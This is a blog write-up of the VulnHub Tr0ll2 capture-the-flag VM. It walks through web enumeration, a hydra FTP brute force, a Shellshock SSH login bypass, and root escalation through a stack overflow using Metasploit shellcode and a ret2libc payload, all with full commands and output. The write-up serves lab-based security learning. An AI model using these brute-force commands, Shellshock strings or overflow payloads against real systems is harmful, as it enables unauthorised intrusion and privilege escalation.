---
layout: post
title: "Beating the Troll - Tr0ll2 writeup"
date: 2014-10-28 19:57:51 +1100
comments: true
categories: [boot2root, shellshock, buffer overflow, ret2libc, vulnhub, writeup, pentesting]
---

Damn, I love [VulnHub](http://www.vulnhub.com) - always keeps me entertained! With so many VMs released recently and with me just coming off an awesome CTF I have been kept quite busy those last couple weeks! Keeping the momentum up, I decided to give [Tr0ll2 VM](http://vulnhub.com/entry/tr0ll-2,107/) a shot. As expected, there were trolls on the way, but overall I quite enjoyed it! Alright, let's rock on.

<!-- more -->


Recon
-----

As per usual, let's boot up the VM and find its IP address using ```netdiscover```:

```
root@kali:~# netdiscover -r 172.16.246.0/24
 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                               
                                                                                                                                                             
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                             
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor                   
 ----------------------------------------------------------------------------- 
 172.16.246.1    00:50:56:c0:00:01    01    060   VMWare, Inc.                                                                                               
 172.16.246.135  00:0c:29:68:a8:92    01    060   VMware, Inc.                                                                                               
 172.16.246.254  00:50:56:f7:73:6c    01    060   VMWare, Inc.                                                                                               
```

And ```nmap``` to see what services are exposed:

```
root@kali:~# nmap -sV 172.16.246.135

Starting Nmap 6.47 ( http://nmap.org ) at 2014-10-28 19:50 EST
Nmap scan report for 172.16.246.135
Host is up (0.00018s latency).
Not shown: 997 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
MAC Address: 00:0C:29:68:A8:92 (VMware)
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 24.28 seconds

```

As expected, webserver running on port 80. By the way, looking at software and versions nothing seems to be immediatelly exploitable and FTP server doesn't allow annonymous login.


Enumerating the web server
--------------------------

Let's have a look at the website.

![Troll](/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/troll_main.png)

First troll, many more to come! First thought - let's fire up ```dirbuster``` and see what it'll come up with. Unfortunately, it didn't come up with anything interesting at all.

Let's check for ```robots.txt``` file.

```
User-agent:*
Disallow:
/noob
/nope
/try_harder
/keep_trying
/isnt_this_annoying
/nothing_here
/404
/LOL_at_the_last_one
/trolling_is_fun
/zomg_is_this_it
/you_found_me
/I_know_this_sucks
/You_could_give_up
/dont_bother
/will_it_ever_end
/I_hope_you_scripted_this
/ok_this_is_it
/stop_whining
/why_are_you_still_looking
/just_quit
/seriously_stop

```

Aha! Let's check is there anything interesting hiding there. I tried couple of the folders one by one, but it's gotten quite boring and repetitive, so I've dumped all directories into ```list.txt``` file and crafted a very simple one-liner to do all the hard work for me :)

```
root@kali:~# for dir in `cat list.txt`; do echo "------- $dir -------"; curl http://172.16.246.135$dir; done
------- /noob -------
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://172.16.246.135/noob/">here</a>.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80</address>
</body></html>
------- /nope -------
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /nope was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80</address>
</body></html>
------- /try_harder -------
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL /try_harder was not found on this server.</p>
<hr>
<address>Apache/2.2.22 (Ubuntu) Server at 172.16.246.135 Port 80</address>
</body></html>

... (truncated) ...

```

As you can see, quite a few of them resulted in ```404 Not Found``` and just a couple were invoking redirection to the same folder, but followed with ```/```. I have manually visited all of them (```/noob/```, ```/keep_trying/```, ```/dont_bother``` and ```/ok_this_is_it/```) and they all contained the same image:

![Troll Kitty](/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/troll_kitty.jpg)

I have saved each one of them for reference (looking at source code of the pages, they were all coming from different location, so the images could really be different).

I have tried poking around a bit more and couldn't find anything else that seemed interesting, so I decided to look closer into the images, starting with the previously downloaded kitten ones. Let's run strings on them and see if something interesting comes up.

```
root@kali:~/Desktop# strings cat_the_troll_dont_bother.jpg 
JFIF
#3-652-108?QE8<M=01F`GMTV[\[7DcjcXjQY[W
)W:1:WWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWWW
"aq2
\vRH
sdwTi

... (truncated) ...

]=%em;
lj\p
*/ p?E$
Look Deep within y0ur_self for the answer
```

Ha! One from ```/dont_bother/``` contains a message! But what is it trying to tell us?

"look within y0ur_self"? Hmmm, it could be another directory on the webserver?

![y0ur_self Dir](/images/posts/2014-10-28-beating-the-troll-tr0ll2-writeup/y0ur_self.png)

Sure it is!


Dictionaries and cracking passwords
-----------------------------------

Let's see what the ```answer.txt``` file contains.

```
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
QU9MCg==
QU9MCg==
QVNDSUkK
QVNMCg==
QVRNCg==
QVRQCg==
QVdPTAo=
QVoK
QVpUCg==
QWFjaGVuCg==
QWFsaXlhaAo=
QWFsaXlhaAo=
QWFyb24K
QWJiYXMK
QWJiYXNpZAo=
QWJib3R0Cg==
QWJib3R0Cg==
QWJieQo=
QWJieQo=
QWJkdWwK
QWJkdWwK

... (truncated) ...
```

Looks like base64 encoded strings. Let's download the file and decode them all! Once again, simple one-liner will help us out:

```
root@kali:~/Desktop# for word in `cat answer.txt`; do echo $word | base64 -d; done > answer-decoded.txt
```

It will take a while... after all it's a pretty big file. Once all done, we can see that it's some kind of a dictionary.

```
root@kali:~/Desktop# cat answer-decoded.txt 

... (truncated) ...

interpretative
interpreted
interpreter
interpreter
interpreters
interpreting
interpretive
interprets
interracial
interred
interrelate
interrelated
interrelates
interrelating

... (truncated) ...
```

And upon further googling and researching, I found out that it seems to be a dictionary shipped by default with Ubuntu.

Fortunately I had Ubuntu installed and decided to grab its dictionary and compare it to the ```answer-decoded.txt``` file - knowing trolls, probably some new words were added that could be the clue!

First difference I noticed was that all apostrophies were trimmed out from ```answer-decoded.txt```. Let's do the same for Ubuntu dictionary using a nice ```vim``` trick to remove everything from ```'``` till the end of the line:

```
:%s/'[^$]*//g
```

Ok, this will result in some duplicates, so let's get rid of them on both files:

```
root@kali:~/Desktop# sort -u answer-decoded.txt > answer-decoded-nodup.txt
root@kali:~/Desktop# sort -u ubuntu-dict.txt > ubuntu-dict-nodup.txt
```

And run ```diff``` on them:

```
root@kali:~/Desktop# diff ubuntu-dict-nodup.txt -u answer-decoded-nodup.txt > diff.txt
root@kali:~/Desktop# cat diff.txt
--- ubuntu-dict-nodup.txt  2014-10-28 06:25:08.083151991 -0400
+++ answer-decoded-nodup.txt    2014-10-28 06:25:21.103151724 -0400
@@ -2326,7 +2326,6 @@
 angry
 angst
 angstrom
-Ångström
 angstroms

... (truncated) ...

@@ -34174,6 +34161,7 @@
 italics
 Italy
 Itasca
+ItCantReallyBeThisEasyRightLOL
 itch
 itched
 itches
@@ -43524,6 +43512,7 @@
 noon
 noonday
 noontime
+noooob_lol
 noose
 nooses
 Nootka
@@ -67180,6 +67169,7 @@
 trolleys
 trollies
 trolling
+trollololol
 trollop
 Trollope
 trollops
```

Awesome, so there are 3 strings that seem that were added to the original list:

* ItCantReallyBeThisEasyRightLOL
* noooob_lol
* trollololol

We may be able to use them as passwords/usernames later.

After more poking around, a cup of coffee and some frustration, I wasn't able to squeeze out anything interesting from the ```answer.txt``` file or the webserver, so I moved on to focus on FTP server.

Having a list of *potential* usernames and passwords, I decided to perform dictionary attack on the FTP server using harvested data as below.

*Note: after numerous trials and errors, frustration and doubts, I decided to add more words to the dictionary*

```
root@kali:~/Desktop# cat dict.txt 
ItCantReallyBeThisEasyRightLOL
noooob_lol
trollololol
noob
nope
try_harder
keep_trying
isnt_this_annoying
nothing_here
404
LOL_at_the_last_one
trolling_is_fun
zomg_is_this_it
you_found_me
I_know_this_sucks
You_could_give_up
dont_bother
will_it_ever_end
I_hope_you_scripted_this
ok_this_is_it
stop_whining
why_are_you_still_looking
just_quit
seriously_stop
troll
Tr0ll
Tr0ll2
Tr0ll:2
Tr0llv2
Maleus
```

Let's use ```hydra``` and see if we'll be able to crack the username:password combination with any of those.

```
root@kali:~/Desktop# hydra -t 30 -L dict.txt -P dict.txt 172.16.246.135 ftp -e nsr -f
Hydra v7.6 (c)2013 by van Hauser/THC & David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-28 21:42:16
[DATA] 30 tasks, 1 server, 990 login tries (l:30/p:33), ~33 tries per task
[DATA] attacking service ftp on port 21

[STATUS] 620.00 tries/min, 620 tries in 00:01h, 370 todo in 00:01h, 30 active
[21][ftp] host: 172.16.246.135   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 172.16.246.135 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-28 21:43:38
```

HAAAAAAAAAAA! Let's log-in using Tr0ll:Tr0ll credentials.

```
root@kali:~/Desktop# ftp 172.16.246.135
Connected to 172.16.246.135.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (172.16.246.135:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Oct 04 01:24 .
drwxr-xr-x    2 0        0            4096 Oct 04 01:24 ..
-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
226 Directory send OK.
```

Just one file, ```lmao.zip```, let's get it.

```
ftp> get lmao.zip
local: lmao.zip remote: lmao.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (2460.6 kB/s)
ftp> quit
221 Goodbye.
```

And unzip:

```
root@kali:~/Desktop# unzip lmao.zip 
Archive:  lmao.zip
[lmao.zip] noob password: 
```

Password protected?! Ahhhhh... luckily, I had a good gut feel and got it at the first try - remember the string ```ItCantReallyBeThisEasyRightLOL```? It did kinda look like password... well, it is! :)

As a result, we get a ```noob``` file, which is an RSA private key!

```
root@kali:~/Desktop# cat noob 
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
```

Breaking into shell? Shock(ing)!
--------------------------------

Sweet, let's use it to log-in via `ssh`. But what username should we use? Let's try ```noob```.

```
root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob 
TRY HARDER LOL!
Connection to 172.16.246.135 closed.
```

What the hell?! The connection is closed straight away. Okay, I know few workarounds for it... Let's try calling different shell at the log-in:

```
root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "/bin/sh"
TRY HARDER LOL!
Connection to 172.16.246.135 closed.
```

Nope. How about starting shell without the 'rc' profile:

```
root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "bash --noprofile"
TRY HARDER LOL!
Connection to 172.16.246.135 closed.
```

Arrrghhh! It's getting annoying. What's other way I can bypass that...? And then it hit me - how could I forget about it (it kept me up at night for much longer than I would've like), ladies and gentleman - SHELLSHOCK!

```
root@kali:~/Desktop# ssh noob@172.16.246.135 -i noob -t "() { :; }; /bin/bash"
noob@Tr0ll2:~$ 
```

Sweeeeeeeet, we're in! :D


Exploiting buffer overflow
--------------------------

After a bit of a poking around we can quickly find an interesting folder with even more interesting files:

```
noob@Tr0ll2:~$ cd /nothing_to_see_here/choose_wisely/
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls
door1  door2  door3
noob@Tr0ll2:/nothing_to_see_here/choose_wisely$ ls -al *
door1:
total 16
drwsr-xr-x 2 root root 4096 Oct  4 22:19 .
drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
-rwsr-xr-x 1 root root 7271 Oct  4 22:19 r00t

door2:
total 20
drwsr-xr-x 2 root root 4096 Oct  5 21:19 .
drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
-rwsr-xr-x 1 root root 8401 Oct  5 21:17 r00t

door3:
total 16
drwsr-xr-x 2 root root 4096 Oct  5 21:18 .
drwsr-xr-x 5 root root 4096 Oct  4 22:36 ..
-rwsr-xr-x 1 root root 7273 Oct  5 21:18 r00t
```

Three binaries owned by root with a 'sticky bit' set! Seems like we should be able to get our privilege escalation through it.

But that's where the trolls hit again, only one of these binaries is actually useful, other two are just trolling with you - one of them reboots the VM and the other puts you in a restricted shell for a limited period of time. The one of interest that we'll be exploiting is the biggest one. Also, it seems that periodically the binaries are shuffled around the directories (once it's ```door1```, then maybe ```door3``` etc.), so make sure to always keep an eye on the size of the binary you're working on.

Alright, let's get to the fun part! First, let's run the right binary and see what it does.

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t 
Usage: ./r00t input
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t AAAAAAAAAAAAAA
AAAAAAAAAAAAAA
```

OK, it seems like it's just replaying the input. Let's pass in something big.

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 400')
Segmentation fault
```

Hahaaa! Hello seg-fault, I was expecting you. Let's find out can we overwrite return address and what's the offset.

As always, best tool for the job - ```pattern_create.rb``` in metasploit tools.

```
root@kali:/usr/share/metasploit-framework/tools# ./pattern_create.rb 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Conveniently ```gdb``` is installed on the host, so we can do our debugging in there. Let's find the offset!

```
(gdb) run Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
Starting program: /nothing_to_see_here/choose_wisely/door3/r00t Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

Program received signal SIGSEGV, Segmentation fault.
0x6a413969 in ?? ()
```

```
root@kali:/usr/share/metasploit-framework/tools# ./pattern_offset.rb 6a413969
[*] Exact match at offset 268
root@kali:/usr/share/metasploit-framework/tools# 
```

Cool! So we need to overwrite 268 bytes to get to the EIP. Let's see what protections are enabled using another useful tool ```checksec.sh```, copy it onto the host and see what it'll tell us about our binary:

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/checksec.sh --file r00t 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   r00t
```

Awesome! Pretty much everything disabled - that should be easy :) And since we're on 32 bit machine, just a quick precautionary increase of the stack size to 'disable' ASLR to prevent messing with our addresses.

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ uname -a
Linux Tr0ll2 3.2.0-29-generic-pae #46-Ubuntu SMP Fri Jul 27 17:25:43 UTC 2012 i686 i686 i386 GNU/Linux
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ulimit -s unlimited
```

We're good to go! There are couple methods how we can exploit it and I'll describe two that came to my mind straight away - putting a shellcode in an environment variable and ret2libc. Let's do it!


Buffer overflow with payload in an environment variable
-------------------------------------------------------

Since NX is disabled, we can execute code from anywhere, including .data section. That makes it pretty simple, we can put the shellcode we want to run in an environment variable and overwrite EIP with address of the shellcode.

First, let's create a shellcode with Metasploit.

```
msf > use payload/linux/x86/exec 
msf payload(exec) > show options

Module options (payload/linux/x86/exec):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
   CMD                    yes       The command string to execute

msf payload(exec) > set CMD /bin/sh
CMD => /bin/sh
msf payload(exec) > generate -b '\x00' -s 50
# linux/x86/exec - 120 bytes
# http://www.metasploit.com
# Encoder: x86/shikata_ga_nai
# NOP gen: x86/opty2
# VERBOSE=false, PrependFork=false, PrependSetresuid=false, 
# PrependSetreuid=false, PrependSetuid=false, 
# PrependSetresgid=false, PrependSetregid=false, 
# PrependSetgid=false, PrependChrootBreak=false, 
# AppendExit=false, CMD=/bin/sh
buf = 
"\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8" +
"\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b" +
"\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14" +
"\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd" +
"\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03" +
"\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59" +
"\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1" +
"\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1" +
"\x48\x75\x66\x56\x01\x94\x45\xd8"
```

Calling ```generate``` with ```-b '\x00'``` to avoid NULL bytes that could mess up our exploit and ```-s 50``` to include 50 byte NOP sled. This will help us locating the shellcode in the memory as we won't need to provide exact address where the shellcode starts, but just a rough vicinity (we can land anywhere on NOPs).

Let's put the shellcode in the environment.

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ export EGG=$(python -c 'print "\xb4\xbb\x46\x02\xd4\x35\x05\xf8\xbf\x4a\x1d\xb1\x93\xa8\x24\x3f\x91\x27\x2f\xb2\x41\x42\x34\x77\x13\xfd\xb0\x9b\xb6\x99\x4f\x0c\x3d\x66\x3c\xba\xb9\x43\xb5\x8d\xb7\x14\x96\x97\xb3\x37\x49\xf9\x4b\x40\xb8\xd9\xf7\xa2\xd9\xdd\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x0b\x31\x45\x15\x03\x45\x15\x83\xc5\x04\xe2\x2c\x9d\xa9\x81\x57\x30\xc8\x59\x4a\xd6\x9d\x7d\xfc\x37\xed\xe9\xfc\x2f\x3e\x88\x95\xc1\xc9\xaf\x37\xf6\xc2\x2f\xb7\x06\xfc\x4d\xde\x68\x2d\xe1\x48\x75\x66\x56\x01\x94\x45\xd8"')
```

And it's in! Now all we need to do, is find its address and overwrite EIP with it. To do it, let's reach to yet another tool in my arsenal - simple C code to locate environment variables.

{% codeblock lang:c %}
#include <unistd.h>

void main()
{
    printf("EGG address 0x%lx\n", getenv("EGG"));
    return 0;
}
{% endcodeblock %}

Copy it across, compile and run to find the address of our EGG (shellcode).

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/egghunt 
EGG address 0xbffffe57
```

Alright, so we have the address of the EGG, let's try to exploit it! Again, we need to overwrite 268 bytes to get to EIP and then pass in address of our shellcode.

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 268 + "\x57\xfe\xff\xbf"')
Segmentation fault
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ./r00t $(python -c 'print "A" * 268 + "\x67\xfe\xff\xbf"')
# whoami
root
```

Voila! :) Needed to adjust address of shellcode a little bit, but thanks to NOP sled we got it on a second try - that was pretty simple. Let's now have a look at ret2libc option (my personal favourite).


Ret2libc
--------

So, with ret2libc things are a little bit different. If NX was enabled, it would mean we can only execute code from executable sectors of the program and the approach described above wouldn't work.

In order to bypass this, we can utilise functions in the C libraries that are generally loaded by majority of the programs. One particular function we would want to use is ```system()``` that invokes system commands passed in. Because it takes a parameter, we need to create a fake stack frame to make it look like it's really a function being called.

Essentially, we want to make the stack look as follows:

{% codeblock %}
.
                -- Current --                    -- Target --
     0000
             ------------------               ------------------
             |                |               |                |
             |                |               | AAAAAAAAAAAAAA |
       ^     |     Buffer     |               | AAAAAAAAAAAAAA |   
       |     |                |   268 bytes   | AAAAAAAAAAAAAA |  Overflow buffer with dummy data
     stack   |                |               | AAAAAAAAAAAAAA |
     growth  ------------------               | AAAAAAAAAAA... |
       |     |  Base pointer  |               |                |  
       |     ------------------               ------------------
             | Return address |    4 bytes    |    system()    |   system() call
             ------------------               ------------------
             |                |    4 bytes    |      BBBB      |   dummy return from system()
             |  Rest of the   |               ------------------
             |     stack      |    4 bytes    | /bin/sh (&EGG) |   address of the EGG environment variable
             |                |               ------------------   containing string argument passed to system()
             |      ...       |               |       ...      |
     FFFF
{% endcodeblock %}

First, let's get the address of ```system``` using ```gdb```

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ gdb r00t 
GNU gdb (Ubuntu/Linaro 7.4-2012.04-0ubuntu2.1) 7.4-2012.04
Copyright (C) 2012 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
<http://bugs.launchpad.net/gdb-linaro/>...
Reading symbols from /nothing_to_see_here/choose_wisely/door3/r00t...done.
(gdb) run
Starting program: /nothing_to_see_here/choose_wisely/door3/r00t 
Usage: /nothing_to_see_here/choose_wisely/door3/r00t input
[Inferior 1 (process 2379) exited normally]
(gdb) p system
$1 = {<text variable, no debug info>} 0x40069060 <system>
```

Cool, we know where the system function call resides (0x40069060), now - what do we want to call? How about ```/bin/sh```? There's one problem though - when passing it as an argument to ```system()```, we need to pass an address of the string going in as argument.

There are couple of options - we can either try to find it in existing environment variables (but it may be hard as the string we want may not be there and we would need to be exact regarding its memory address to be able to extract it) or we can simply create new environment variable with whatever value we want and pass that in!

Going with the second option, we control what value we want to pass in and we can also do a variety of a NOP sled as in the previous example.

As before, let's create an environment variable to use as an argument to our ```system()``` call.

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ export EGG=//////////////////////////////////////////////////////bin/sh
```

Number of ```/``` acts as a NOP sled, we can land anywhere on them and the exploit will still work, thus, we don't need to be super specific about the string's memory location.

Now we just need it's address and we are ready to rock! Let's use the same ```egghunt``` program as in the previous example.

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$ ~/egghunt 
EGG address 0xbffffe93
```

Awesome! Let's craft our exploit - again, we'll need (in sequence):

* 268 bytes of dummy data
* address of system
* 4 bytes of dummy data
* address of /bin/sh string

Let's do it!

```
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\x93\xfe\xff\xbf"')
Segmentation fault
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\xa3\xfe\xff\xbf"')
sh: 1: s/0: not found
Segmentation fault
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door2$ ./r00t $(python -c 'print "A" * 268 + "\x60\x90\x06\x40" + "BBBB" + "\xb3\xfe\xff\xbf"')
# whoami
root
# 
```

Got it! On the 3rd try, didn't seem to be able to guess EGG address that effectively this time, but at the end of the day it worked! :) Now you see why having a decent size NOP sled helps, otherwise, we would need to find *EXACT* address where it starts... in some situations it could be pretty hard if not impossible to do!

Oh, right, let's get the flag!

```
# cd /root
# ls
core1  core2  core3  core4  goal  hardmode  lmao.zip  Proof.txt  ran_dir.py  reboot
# cat Proof.txt
You win this time young Jedi...

a70354f0258dcc00292c72aab3c8b1e4  
```


Summary
-------

